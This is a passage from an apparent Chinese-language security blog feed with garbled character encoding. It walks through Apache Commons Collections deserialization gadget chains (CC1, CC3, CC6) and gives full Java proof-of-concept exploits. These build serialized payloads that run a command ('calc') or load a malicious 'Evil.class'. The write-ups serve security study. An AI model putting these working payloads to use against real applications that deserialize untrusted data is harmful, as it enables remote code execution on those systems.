class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilterCC6CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\cc3\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//putæ—¶è°ƒç”¨åˆ°ConstantTransformerï¼Œä½¿å…¶ä¸ä¼šè§¦å‘</span></span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¹‹å‰å†é€šè¿‡åå°„æ”¹ä¸ºChainedTransformer</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factories</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factories.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factories.set(lazyMap,chain);</span><br><span class="line"></span><br><span class="line">        serilize(map2);</span><br><span class="line">        unserlize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppmJj8U"><img src="https://s1.ax1x.com/2023/03/08/ppmJj8U.png" alt="ppmJj8U.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--CC6</title>
      <link href="/2022/10/04/CC6/"/>
      <url>/2022/10/04/CC6/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collecttions6ååºåˆ—åŒ–"><a href="#Commons-Collecttions6ååºåˆ—åŒ–" class="headerlink" title="Commons-Collecttions6ååºåˆ—åŒ–"></a>Commons-Collecttions6ååºåˆ—åŒ–</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºMavené¡¹ç›®ï¼Œå¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p><a href="https://imgse.com/i/ppeClgH"><img src="https://s1.ax1x.com/2023/03/07/ppeClgH.png" alt="ppeClgH.png"></a></p><p>ä¸cc1ä¸åŒä¹‹å¤„æ˜¯ç”¨<code>TiedMapEntry.hashCode</code>å»è°ƒç”¨<code>LazyMap.get</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getValue()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­mapä¸ºæ„é€ å‡½æ•°ä¸­å¯æ§å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªéœ€ä»¤mapä¸º <code>LazyMap</code> </p><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p>HashMap.readObjectè°ƒç”¨hashå‡½æ•°ï¼Œhashå‡½æ•°ä¸­è°ƒç”¨hashCode()</p><p><a href="https://imgse.com/i/ppektyQ"><img src="https://s1.ax1x.com/2023/03/07/ppektyQ.png" alt="ppektyQ.png"></a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªéœ€ä»¤keyä¸º <code>TiedMapEntry</code></p><p><strong>demo2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½†å¦‚æœåƒè¿™æ ·ç›´æ¥ç”¨putï¼Œä¼šæå‰è°ƒç”¨hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨LazyMapé‡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè°ƒç”¨çš„æ˜¯factory.transform(key)ï¼Œè€Œfactoryå¯ä»¥é€šè¿‡åå°„ä¿®æ”¹ï¼Œæ‰€ä»¥åªéœ€åœ¨putæ—¶è°ƒç”¨ä¸€ä¸ªæ²¡ç”¨çš„ï¼Œåœ¨åºåˆ—åŒ–å‰åœ¨é€šè¿‡åå°„å°†factoryæ”¹æˆ<code>ChainedTransformer</code></p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//putæ—¶è°ƒç”¨åˆ°ConstantTransformerï¼Œä½¿å…¶ä¸ä¼šè§¦å‘</span></span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¹‹å‰å†é€šè¿‡åå°„æ”¹ä¸ºChainedTransformer</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factories</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factories.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factories.set(lazyMap,chain);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppeRdk8"><img src="https://s1.ax1x.com/2023/03/08/ppeRdk8.png" alt="ppeRdk8.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--CC1</title>
      <link href="/2022/10/03/CC1/"/>
      <url>/2022/10/03/CC1/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collecttions1ååºåˆ—åŒ–"><a href="#Commons-Collecttions1ååºåˆ—åŒ–" class="headerlink" title="Commons-Collecttions1ååºåˆ—åŒ–"></a>Commons-Collecttions1ååºåˆ—åŒ–</h1><p>Apache Commons å½“ä¸­æœ‰â¼€ä¸ªç»„ä»¶å«åš Apache Commons Collections ï¼Œä¸»è¦å°è£…äº†Java çš„ Collection(é›†åˆ) ç›¸å…³ç±»å¯¹è±¡ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰â¼’çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚</p><p>ä½œä¸ºApacheå¼€æºé¡¹â½¬çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«â¼´æ³›åº”â½¤äºå„ç§Javaåº”â½¤çš„å¼€å‘ï¼Œâ½½æ­£æ˜¯å› ä¸ºåœ¨â¼¤é‡webåº”â½¤ç¨‹åºä¸­è¿™äº›ç±»çš„å®ç°ä»¥åŠâ½…æ³•çš„è°ƒâ½¤ï¼Œå¯¼è‡´äº†ååºåˆ—åŒ–â½¤æ¼æ´çš„æ™®éæ€§å’Œä¸¥é‡æ€§ã€‚</p><p>Commons Collectionsä¹Ÿæ˜¯javaå®‰å…¨çš„èµ·æºä¹‹è·¯</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºMavené¡¹ç›®ï¼Œå¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="TransformedMapé“¾"><a href="#TransformedMapé“¾" class="headerlink" title="TransformedMapé“¾"></a>TransformedMapé“¾</h2><p><a href="https://imgse.com/i/ppElxZF"><img src="https://s1.ax1x.com/2023/03/04/ppElxZF.png" alt="ppElxZF.png"></a></p><p>å…¥å£æ˜¯<code>InvokerTransformer.transform()</code></p><p>å‚æ•°å¯æ§ï¼Œåå°„è°ƒç”¨ä»»æ„æ–¹æ³•</p><p><a href="https://imgse.com/i/ppErOht"><img src="https://s1.ax1x.com/2023/03/05/ppErOht.png" alt="ppErOht.png"></a></p><p>å€Ÿæ­¤å¯è°ƒç”¨Runtime.execæ‰§è¡Œä»»æ„å‘½ä»¤</p><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">transforedmap2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾€ä¸Šæ‰¾ï¼Œ<code>TransformedMap.checkSetValue()</code>æœ‰<code>valueTransformer.transform(value);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°TransformedMapç±»çš„æ„é€ å‡½æ•°ï¼Œå¯¹mapçš„é”®å€¼è¿›è¡Œäº†ä¸€äº›æ“ä½œ</p><figure class="highlight 